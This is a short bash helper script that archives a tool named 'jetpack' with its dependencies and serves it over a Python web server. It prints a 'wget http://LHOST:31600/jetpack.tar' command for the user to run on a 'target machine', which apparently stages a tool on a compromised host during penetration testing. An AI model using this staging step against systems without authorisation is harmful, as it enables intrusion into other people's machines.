#!/bin/bash
echo " "
echo "Use this script to pack jetpack and transfer it onto your target machine ! "
echo " "
tar -cf jetpack.tar jetpack.sh Dependencies && echo "Archive Successfully Created ! Spawning Web Server"
echo " "
echo "Use the following command on the target machine : wget http://LHOST:31600/jetpack.tar"
echo " "
echo "Use CTRL+C When done to kill the Web Server"
echo " "
python3 -m http.server 31600
